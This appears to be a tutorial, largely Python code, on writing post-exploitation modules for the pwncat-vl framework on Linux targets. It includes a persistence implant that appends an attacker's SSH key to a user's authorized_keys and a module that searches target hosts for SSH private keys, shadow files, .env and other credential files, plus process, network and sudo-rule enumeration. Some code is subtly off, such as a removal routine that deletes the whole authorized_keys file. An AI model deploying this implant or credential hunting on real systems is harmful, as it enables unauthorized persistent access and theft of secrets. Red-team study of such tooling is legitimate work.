# Complete Tutorial: Writing pwncat-vl Modules for Linux Platform

## Table of Contents
1. [Introduction to pwncat Module Architecture](#introduction)
2. [Module Types and Categories](#module-types)
3. [Basic Module Structure](#basic-structure)
4. [Enumeration Modules](#enumeration-modules)
5. [Implant Modules](#implant-modules) 
6. [Privilege Escalation Modules](#privilege-escalation-modules)
7. [Using Internal Submodules](#internal-submodules)
8. [Advanced Examples](#advanced-examples)
9. [Best Practices](#best-practices)

## Introduction {#introduction}

pwncat-vl uses a modular architecture where all functionality is implemented as modules. This includes enumeration, persistence, and privilege escalation. The framework provides several module categories:
- **enumerate**: Gather information about the target
- **implant**: Install persistence mechanisms
- **escalate**: Attempt privilege escalation

## Module Types and Categories {#module-types}

### 1. Enumerate Modules
Used for information gathering. These discover facts about the system such as running processes, installed software, network connections, and file permissions.

### 2. Implant Modules
Used to establish persistent access to the target system through various methods like SSH keys, cron jobs, or SUID binaries.

### 3. Escalate Modules
Used to attempt privilege escalation by exploiting known vulnerabilities or misconfigurations.

## Basic Module Structure {#basic-structure}

All modules follow a similar structure:

```python
#!/usr/bin/env python3

# Import required modules
import re
from pwncat.db import Fact
from pwncat.platform.linux import Linux
from pwncat.modules.enumerate import Schedule, EnumerateModule

# Define a Fact class to represent discovered information
class MyFact(Fact):
    def __init__(self, source, data):
        super().__init__(source=source, types=["my.category"])
        self.data = data
    
    def title(self, session):
        return f"[cyan]My Title[/cyan]: {self.data}"
    
    def description(self, session):
        return f"Description: {self.data}"

# Define the main module class
class Module(EnumerateModule):
    PROVIDES = ["my.category"]
    PLATFORM = [Linux]
    SCHEDULE = Schedule.ONCE  # or Schedule.PER_USER, Schedule.ALWAYS
    
    def enumerate(self, session):
        # Your module logic here
        yield MyFact(self.name, "some_value")
```

## Enumeration Modules {#enumeration-modules}

Let's create some practical enumeration modules:

### Example 1: System Information Module

```python
#!/usr/bin/env python3

import subprocess
import re

from pwncat.db import Fact
from pwncat.platform.linux import Linux
from pwncat.modules.enumerate import Schedule, EnumerateModule


class SystemInfo(Fact):
    """System information fact"""
    
    def __init__(self, source, info):
        super().__init__(source=source, types=["system.info"])
        self.info = info

    def title(self, session):
        return f"[green]System Info[/green]: {self.info.get('hostname', 'Unknown')}"

    def description(self, session):
        desc = []
        for key, value in self.info.items():
            desc.append(f"{key}: {value}")
        return "\n".join(desc)


class Module(EnumerateModule):
    """Gather basic system information"""
    
    PROVIDES = ["system.info"]
    PLATFORM = [Linux]
    SCHEDULE = Schedule.ONCE

    def enumerate(self, session):
        system_info = {}
        
        # Get hostname
        try:
            result = session.platform.run(["hostname"], capture_output=True, text=True, check=True)
            system_info["hostname"] = result.stdout.strip()
        except:
            system_info["hostname"] = "Unknown"

        # Get OS version
        try:
            with session.platform.open("/etc/os-release", "r") as f:
                os_info = f.read()
                match = re.search(r'PRETTY_NAME="([^"]*)"', os_info)
                if match:
                    system_info["os"] = match.group(1)
        except:
            try:
                result = session.platform.run(["uname", "-a"], capture_output=True, text=True, check=True)
                system_info["os"] = result.stdout.strip()
            except:
                system_info["os"] = "Unknown OS"

        # Get kernel version
        try:
            result = session.platform.run(["uname", "-r"], capture_output=True, text=True, check=True)
            system_info["kernel"] = result.stdout.strip()
        except:
            system_info["kernel"] = "Unknown"

        if system_info:
            yield SystemInfo(self.name, system_info)
```

### Example 2: Currently Running Processes Module

```python
#!/usr/bin/env python3

import subprocess
from pwncat.db import Fact
from pwncat.platform.linux import Linux
from pwncat.modules.enumerate import Schedule, EnumerateModule


class Process(Fact):
    """A running process"""
    
    def __init__(self, source, pid, user, command):
        super().__init__(source=source, types=["process"])
        self.pid = pid
        self.user = user
        self.command = command

    def title(self, session):
        return f"[yellow]Process[/yellow] [cyan]{self.pid}[/cyan] - [green]{self.user}[/green]: {self.command}"


class Module(EnumerateModule):
    """Enumerate running processes"""
    
    PROVIDES = ["process"]
    PLATFORM = [Linux]
    SCHEDULE = Schedule.ALWAYS  # Processes change frequently

    def enumerate(self, session):
        try:
            # Use ps command to get process list
            proc = session.platform.Popen(
                ["ps", "-eo", "pid,user,comm", "--no-headers"],
                stdout=subprocess.PIPE,
                stderr=subprocess.DEVNULL,
                text=True
            )
            
            with proc.stdout as stream:
                for line in stream:
                    line = line.strip()
                    if not line:
                        continue
                    
                    parts = line.split(maxsplit=2)
                    if len(parts) >= 3:
                        pid, user, command = parts[0], parts[1], parts[2]
                        yield Process(self.name, pid, user, command)
                        
        except Exception as e:
            session.print(f"[red]Error enumerating processes: {e}[/red]")
```

## Implant Modules {#implant-modules}

Implant modules are used to establish persistent access to a target.

### Example 3: SSH Key Implant Module

```python
#!/usr/bin/env python3

import os
from pathlib import Path

from pwncat.db import Fact
from pwncat.platform.linux import Linux
from pwncat.modules.Implant import ImplantModule


class SSHImplant(Fact):
    """SSH key implant fact"""
    
    def __init__(self, source, user, path):
        super().__init__(source=source, types=["implant.ssh_key"])
        self.user = user
        self.path = path

    def title(self, session):
        return f"[green]SSH Key Implant[/green] for [cyan]{self.user}[/cyan] at {self.path}"

    def description(self, session):
        return f"Installed SSH public key for user {self.user} at {self.path}"


class Module(ImplantModule):
    """Install an SSH key for persistent access"""
    
    def install(self, session, user=None, ssh_key_path=None):
        # If no user specified, use current user
        if not user:
            user = session.current_user().name
        
        # Get user home directory
        try:
            home_result = session.platform.run(
                ["getent", "passwd", user], 
                capture_output=True, 
                text=True
            )
            home_path = home_result.stdout.split(':')[5]
        except:
            # Fallback to common location
            home_path = f"/home/{user}"
        
        ssh_dir = os.path.join(home_path, ".ssh")
        auth_keys = os.path.join(ssh_dir, "authorized_keys")
        
        # Create .ssh directory if it doesn't exist
        session.platform.run(["mkdir", "-p", ssh_dir], check=True)
        
        # Set proper permissions
        session.platform.run(["chmod", "700", ssh_dir], check=True)
        
        # If no SSH key path provided, generate one locally
        if not ssh_key_path:
            # For this example, we'll use an existing SSH key from local system
            # In practice, you'd want to generate or have the attacker provide their public key
            session.print("[red]Error: SSH key path not provided[/red]")
            return
        
        # Read the SSH key and append to authorized_keys
        with open(ssh_key_path, 'r') as f:
            ssh_key = f.read().strip()
        
        # Append the SSH key to the authorized_keys file
        with session.platform.open(auth_keys, "a") as f:
            f.write(ssh_key + "\n")
        
        # Set proper permissions
        session.platform.run(["chmod", "600", auth_keys], check=True)
        
        yield SSHImplant(self.name, user, auth_keys)
    
    def remove(self, session, fact):
        # Remove the SSH key (this is a simplified version)
        # You'd want to be more careful about removing just the specific key
        session.print(f"[yellow]Removing SSH key implant at {fact.path}[/yellow]")
        session.platform.run(["rm", fact.path], check=True)
```

## Privilege Escalation Modules {#privilege-escalation-modules}

### Example 4: Sudo Misconfiguration Detection Module

```python
#!/usr/bin/env python3

import subprocess
import tempfile

from pwncat.db import Fact
from pwncat.platform.linux import Linux
from pwncat.modules.enumerate import Schedule, EnumerateModule


class SudoRule(Fact):
    """A sudo rule that may be exploitable"""
    
    def __init__(self, source, user, command, target_user):
        super().__init__(source=source, types=["escalate.sudo"])
        self.user = user
        self.command = command
        self.target_user = target_user

    def title(self, session):
        return f"[yellow]Sudo Rule[/yellow]: [green]{self.user}[/green] can run [cyan]{self.command}[/cyan] as [red]{self.target_user}[/red]"

    def description(self, session):
        return f"User {self.user} can execute '{self.command}' as {self.target_user} via sudo"


class Module(EnumerateModule):
    """Check for potential sudo misconfigurations"""
    
    PROVIDES = ["escalate.sudo"]
    PLATFORM = [Linux]
    SCHEDULE = Schedule.ONCE

    def enumerate(self, session):
        try:
            # Get current user to check sudo permissions
            current_user = session.current_user().name
            
            # Run sudo -l to check what the user can do
            result = session.platform.run(
                ["sudo", "-l"], 
                capture_output=True, 
                text=True
            )
            
            # Parse sudo -l output
            lines = result.stdout.splitlines()
            in_allowed_section = False
            
            for line in lines:
                line = line.strip()
                
                if "may run the following" in line.lower():
                    in_allowed_section = True
                    continue
                
                if in_allowed_section:
                    # Look for command specifications
                    if line.startswith("(") or line.startswith("(root)"):
                        # Extract command from line like "(root) NOPASSWD: /bin/bash"
                        parts = line.split()
                        if len(parts) >= 2:
                            target_user = parts[0].strip("()")  # e.g., (root) -> root
                            command = " ".join(parts[2:])  # Skip NOPASSWD: part
                            
                            yield SudoRule(self.name, current_user, command, target_user)
        
        except subprocess.CalledProcessError:
            # sudo -l failed, user likely has no sudo privileges
            pass
        except Exception as e:
            session.print(f"[red]Error checking sudo rules: {e}[/red]")
```

## Using Internal Submodules {#internal-submodules}

You can use other modules from within your modules. Here's an example of a module that uses other enumeration modules:

### Example 5: System Summary Module (using internal submodules)

```python
#!/usr/bin/env python3

from pwncat.db import Fact
from pwncat.platform.linux import Linux
from pwncat.modules.enumerate import Schedule, EnumerateModule


class SystemSummary(Fact):
    """System summary fact"""
    
    def __init__(self, source, summary):
        super().__init__(source=source, types=["system.summary"])
        self.summary = summary

    def title(self, session):
        return f"[blue]System Summary[/blue]"

    def description(self, session):
        return self.summary


class Module(EnumerateModule):
    """Generate a system summary by using other modules"""
    
    PROVIDES = ["system.summary"]
    PLATFORM = [Linux]
    SCHEDULE = Schedule.ONCE

    def enumerate(self, session):
        summary_parts = []
        
        # Get system info (using the system info module we created)
        try:
            # First, ensure system enumeration is done
            sys_facts = list(session.run_module("linux.enumerate.system", exit=False))
            
            # Collect relevant facts from other modules
            user_facts = session.run_module("linux.enumerate.user", exit=False)
            processes = session.run_module("linux.enumerate.process", exit=False)  # our custom module
            software = session.run_module("linux.enumerate.software", exit=False)
            
            # Count users
            user_count = 0
            root_users = []
            for fact in user_facts:
                user_count += 1
                if hasattr(fact, 'uid') and fact.uid == 0:
                    root_users.append(fact.name)
            
            # Count processes
            proc_count = 0
            for _ in processes:
                proc_count += 1
            
            # Add summary information
            summary_parts.append(f"Users: {user_count} (Root users: {len(root_users)})")
            summary_parts.append(f"Running Processes: {proc_count}")
            
        except Exception as e:
            session.print(f"[red]Error gathering system summary: {e}[/red]")
            summary_parts.append(f"Error gathering system summary: {e}")
        
        yield SystemSummary(self.name, "\n".join(summary_parts))
```

## Advanced Examples {#advanced-examples}

### Example 6: Network Connections Module

```python
#!/usr/bin/env python3

import subprocess
import re

from pwncat.db import Fact
from pwncat.platform.linux import Linux
from pwncat.modules.enumerate import Schedule, EnumerateModule


class NetworkConnection(Fact):
    """A network connection"""
    
    def __init__(self, source, protocol, local_addr, local_port, remote_addr, remote_port, state, process):
        super().__init__(source=source, types=["network.connection"])
        self.protocol = protocol
        self.local_addr = local_addr
        self.local_port = local_port
        self.remote_addr = remote_addr
        self.remote_port = remote_port
        self.state = state
        self.process = process

    def title(self, session):
        return f"[green]{self.protocol}[/green] [cyan]{self.local_addr}:{self.local_port}[/cyan] -> [yellow]{self.remote_addr}:{self.remote_port}[/yellow] ({self.state})"


class Module(EnumerateModule):
    """Enumerate network connections"""
    
    PROVIDES = ["network.connection"]
    PLATFORM = [Linux]
    SCHEDULE = Schedule.ALWAYS

    def enumerate(self, session):
        # Try different methods to get network connections
        connections = []
        
        # Method 1: Using ss (modern replacement for netstat)
        try:
            result = session.platform.run(
                ["ss", "-tuln", "-p"],  # TCP, UDP, listening, numeric, process
                capture_output=True,
                text=True
            )
            
            lines = result.stdout.splitlines()
            for line in lines:
                line = line.strip()
                if line.startswith("tcp") or line.startswith("udp"):
                    # Parse ss output format
                    # Example: tcp    LISTEN   0        4096         0.0.0.0:22          0.0.0.0:*      users:(("sshd",pid=876,fd=3))
                    
                    parts = line.split()
                    if len(parts) >= 6:
                        protocol = parts[0]
                        state = parts[1]
                        local = parts[4]
                        remote = parts[5]
                        
                        # Parse local address and port
                        if ":" in local:
                            local_addr, local_port = local.rsplit(":", 1)
                        else:
                            local_addr, local_port = local, "0"
                        
                        # Parse remote address and port
                        if ":" in remote and remote != "*:*":
                            remote_addr, remote_port = remote.rsplit(":", 1)
                        else:
                            remote_addr, remote_port = "*", "*"
                        
                        # Try to extract process info
                        process = "Unknown"
                        if "users:" in line:
                            # Extract process info from the end
                            user_part = line.split("users:", 1)[1] if "users:" in line else ""
                            process_match = re.search(r'\("([^"]+)"', user_part)
                            if process_match:
                                process = process_match.group(1)
                        
                        yield NetworkConnection(
                            self.name, protocol, local_addr, local_port, 
                            remote_addr, remote_port, state, process
                        )
        except:
            # Fallback to netstat if ss is not available
            try:
                result = session.platform.run(
                    ["netstat", "-tulnp"],  # TCP, UDP, listening, numeric, process
                    capture_output=True,
                    text=True
                )
                
                lines = result.stdout.splitlines()
                for line in lines:
                    line = line.strip()
                    if line.startswith("tcp") or line.startswith("udp"):
                        parts = line.split()
                        if len(parts) >= 7:
                            protocol = parts[0]
                            local_addr_port = parts[3]
                            remote_addr_port = parts[4]
                            state = parts[5] if protocol.startswith('tcp') else "N/A"
                            process_info = parts[6] if len(parts) > 6 else "Unknown"
                            
                            # Parse addresses and ports
                            local_addr, local_port = local_addr_port.rsplit(":", 1) if ":" in local_addr_port else (local_addr_port, "0")
                            remote_addr, remote_port = remote_addr_port.rsplit(":", 1) if ":" in remote_addr_port else (remote_addr_port, "0")
                            
                            yield NetworkConnection(
                                self.name, protocol, local_addr, local_port,
                                remote_addr, remote_port, state, process_info
                            )
            except Exception as e:
                session.print(f"[red]Could not enumerate network connections: {e}[/red]")
```

## Best Practices {#best-practices}

### 1. Error Handling
Always implement proper error handling and logging:

```python
def enumerate(self, session):
    try:
        # Your main logic here
        result = session.platform.run(["some", "command"], capture_output=True, text=True)
        # Process result...
        yield SomeFact(self.name, data)
    except subprocess.CalledProcessError as e:
        session.print(f"[yellow]Command failed: {e}[/yellow]")
        return  # Don't yield anything if the command fails
    except FileNotFoundError:
        session.print("[yellow]Command not found[/yellow]")
        return
    except Exception as e:
        session.print(f"[red]Unexpected error: {e}[/red]")
        return
```

### 2. Using the Platform Abstraction
Always use session.platform methods rather than direct system calls:

- Use `session.platform.run()` instead of `os.system()` or `subprocess.run()`
- Use `session.platform.open()` instead of built-in `open()`
- Use `session.platform.Popen()` instead of `subprocess.Popen()`

### 3. Efficient Resource Usage
- Use Popen with streaming for large outputs instead of capturing all output
- Set appropriate timeouts on commands
- Clean up resources in finally blocks

### 4. Integration with pwncat
- Use `session.print()` for output instead of `print()`
- Use Rich markup for colored output
- Follow the fact/module patterns

### Example 7: Complete File Search Module

```python
#!/usr/bin/env python3

import subprocess
import os

from pwncat.db import Fact
from pwncat.platform.linux import Linux
from pwncat.modules.enumerate import Schedule, EnumerateModule


class SensitiveFile(Fact):
    """A sensitive file that may be of interest"""
    
    def __init__(self, source, path, description, perms, size):
        super().__init__(source=source, types=["file.sensitive"])
        self.path = path
        self.description = description
        self.perms = perms
        self.size = size

    def title(self, session):
        return f"[red]Sensitive File[/red] [yellow]{self.path}[/yellow] - {self.description}"

    def description(self, session):
        return f"Path: {self.path}\nDescription: {self.description}\nPermissions: {self.perms}\nSize: {self.size} bytes"


class Module(EnumerateModule):
    """Search for sensitive files"""
    
    PROVIDES = ["file.sensitive"]
    PLATFORM = [Linux]
    SCHEDULE = Schedule.ONCE

    def enumerate(self, session):
        # List of sensitive file patterns to search for
        sensitive_patterns = [
            # SSH keys
            "id_rsa", "id_dsa", "id_ecdsa", "id_ed25519",
            # SSH config files
            "authorized_keys", "known_hosts", "ssh_config", "sshd_config",
            # Database configs
            "*.sql", "database.yml", "database.json",
            # Password files
            "passwd", "shadow", "htpasswd", ".htpasswd",
            # Configuration files
            "config.php", "wp-config.php", ".env", "config.json", "secrets.yaml",
            # Backup files
            "*.bak", "*.backup", "*.old", "*~",
            # Log files
            "access.log", "error.log", "auth.log", "messages",
        ]
        
        for pattern in sensitive_patterns:
            try:
                # Search for files matching the pattern (be careful with permissions)
                find_cmd = ["find", "/home", "/etc", "/var", "/opt", "-name", pattern, "-type", "f", "-not", "-path", "*/proc/*", "-not", "-path", "*/sys/*"]
                result = session.platform.run(
                    find_cmd,
                    capture_output=True,
                    text=True,
                    timeout=30
                )
                
                if result.returncode == 0:
                    for line in result.stdout.strip().split('\n'):
                        line = line.strip()
                        if line:
                            # Get file stats
                            try:
                                stat_result = session.platform.run(
                                    ["stat", "-c", "%A %s", line],
                                    capture_output=True,
                                    text=True,
                                    timeout=10
                                )
                                if stat_result.returncode == 0:
                                    perms, size = stat_result.stdout.strip().split(None, 1)
                                    desc = f"Possible {pattern} file"
                                    yield SensitiveFile(self.name, line, desc, perms, size)
                            except:
                                yield SensitiveFile(self.name, line, f"Found {pattern}", "unknown", "unknown")
                
            except subprocess.TimeoutExpired:
                session.print(f"[yellow]Search for {pattern} timed out, continuing...[/yellow]")
            except Exception as e:
                session.print(f"[yellow]Error searching for {pattern}: {e}[/yellow]")
```

## Module Development Workflow

1. **Identify Purpose**: Determine what information you want to gather or what action you want to perform.
2. **Choose Module Type**: Select appropriate category (enumerate, implant, escalate).
3. **Define Fact Type**: Create a fact class to represent your data.
4. **Implement Main Module**: Create the module class with required attributes.
5. **Add Error Handling**: Handle potential failures gracefully.
6. **Test Thoroughly**: Test your module on different systems.
7. **Follow Best Practices**: Use pwncat abstractions and patterns.

## Running Your Module

After creating your module in the appropriate directory (e.g., `pwncat/modules/linux/enumerate/mymodule.py`), you can run it using:

```
run linux.enumerate.mymodule
```

This comprehensive tutorial should give you a solid foundation for writing pwncat modules. Start with simple enumeration modules and gradually move to more complex implant and escalation modules as you become more familiar with the architecture.